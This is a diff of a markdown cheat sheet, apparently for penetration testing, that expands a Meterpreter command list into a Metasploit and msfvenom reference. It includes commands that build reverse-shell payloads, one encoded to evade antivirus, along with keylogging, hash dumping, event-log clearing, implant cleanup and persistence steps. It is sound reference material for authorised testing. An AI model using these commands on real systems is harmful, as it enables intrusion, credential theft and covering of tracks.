@@ -1,13 +1,129 @@
-# Meterpreter commands
+# Metasploit
+
+### Basics
+
+* Search for modules&#x20;
+
+```
+search [regex]
+```
+
+* Specify exploit
+
+```
+use exploit /path/to/exploit
+```
+
+* Specify Payload&#x20;
+
+```
+set payload path/to/payload
+```
+
+* Set option
+
+```
+set [option] [value]
+```
+
+* Run Exploit
+
+```
+run
+exploit 
+#either will work 
+```
+
+### Port Scan
+
+```
+use auxiliary/scanner/portscan/
+tcp
+set RHOSTS 10.10.10.0/24
+run
+```
+
+### DNS Enumeration
+
+```
+use auxiliary/gather/dns_enum
+set DOMAIN target.tgt
+run
+```
+
+### Host FTP Server
+
+```
+use auxiliary/server/ftp
+set FTPROOT /tmp/ftproot
+run
+```
+
+### Proxy Server
+
+* Any proxied traffic that matches the subnet of a route will be routed through the session specified by route.&#x20;
+* Use proxychains configured for socks4 to route any application's traffic through a Meterpreter session.
+
+```
+use auxiliary/server/socks4
+run
+```
+
+## msfvenom
+
+* The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode them.
+
+### List Payloads&#x20;
+
+```
+msfvenom -l payloads
+```
+
+### Basic Examples
+
+```
+msfvenom -p windows/meterpreter/
+reverse_tcp -f exe LHOST=10.1.1.1
+LPORT=4444 > met.exe
+```
+
+### Format Options
+
+```
+--help-formats #List available output formats
+exe #Executable 
+pl #Perl
+rb #Ruby
+raw #Raw Shellcode
+c #C Code
+```
+
+### Encoders&#x20;
+
+* See all encoders&#x20;
+
+```
+msfvenom -l encoders
+```
+
+* Basic Example:
+
+```
+msfvenom -p windows/meterpreter/
+reverse_tcp -i 5 -e x86/shikata_ga_nai -f
+exe LHOST=10.1.1.1 LPORT=4444 > mal.exe
+```
+
+## Meterpreter
 
 * Core commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used.
 * Remember to check all available commands running the help command once a Meterpreter session has started.
 
-## Post Exploitation Modules Reference
+### Post Exploitation Modules Reference
 
 * https://www.offensive-security.com/metasploit-unleashed/post-module-reference/
 
-## Core commands
+### Core commands
 
 * `background`: Backgrounds the current session
 * `exit`: Terminate the Meterpreter session
@@ -20,7 +136,7 @@
 * `run`: Executes a Meterpreter script or Post module
 * `sessions`: Quickly switch to another session
 
-## File system commands
+### File system commands
 
 * `cd`: Will change directory
 * `ls`: Will list files in the current directory (dir will also work)
@@ -32,7 +148,7 @@
 * `upload`: Will upload a file or directory
 * `download`: Will download a file or directory
 
-## Networking commands
+### Networking commands
 
 * `arp`: Displays the host ARP (Address Resolution Protocol) cache
 * `ifconfig`: Displays network interfaces available on the target system
@@ -40,7 +156,7 @@
 * `portfwd`: Forwards a local port to a remote service
 * `route`: Allows you to view and modify the routing table
 
-## System commands
+### System commands
 
 * `clearev`: Clears the event logs
 * `execute`: Executes a command
@@ -54,7 +170,7 @@
 * `shutdown`: Shuts down the remote computer
 * `sysinfo`: Gets information about the remote system, such as OS
 
-## Others Commands (these will be listed under different menu categories in the help menu)
+### Others Commands (these will be listed under different menu categories in the help menu)
 
 * `idletime`: Returns the number of seconds the remote user has been idle
 * `keyscan_dump`: Dumps the keystroke buffer
@@ -70,7 +186,7 @@
 * `getsystem`: Attempts to elevate your privilege to that of local system
 * `hashdump`: Dumps the contents of the SAM database
 
-## Modules
+### Modules
 
 ### Kiwi Commands
 
@@ -99,7 +215,7 @@ wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
 
 * Although all these commands may seem available under the help menu, they may not all work. For example, the target system might not have a webcam, or it can be running on a virtual machine without a proper desktop environment.
 
-## New Meterpreter Session Steps
+### New Meterpreter Session Steps
 
 * Assuming you gained access, inserted AV Path Exception, wrote implant to disk and executed to catch you callback
 
@@ -126,7 +242,7 @@ del /path/to/implant #remove implant artifact from disk
 download C:\\Users\\Administrator\\Desktop\\secret.txt
 ```
 
-## Post Modules for Windows Survey
+### Post Modules for Windows Survey
 
 ```
 meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
@@ -159,7 +275,7 @@ SHOWDESCRIPTION true
 -----------------------------------------------------------------------
 ```
 
-## Meterpreter Extensions
+### Meterpreter Extensions
 
 ### **kiwi module**&#x20;
 
@@ -195,7 +311,7 @@ set LPORT
 run
 ```
 
-## Routing
+### Routing
 
 ### **Set route**
 
@@ -249,7 +365,7 @@ Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\C
 #will need to restart before changes are applied, thus ensure WMI Event Subscription Persistance or Registry is set up first
 ```
 
-## Persistance Modules
+### Persistance Modules
 
 * Registry Run Key
 
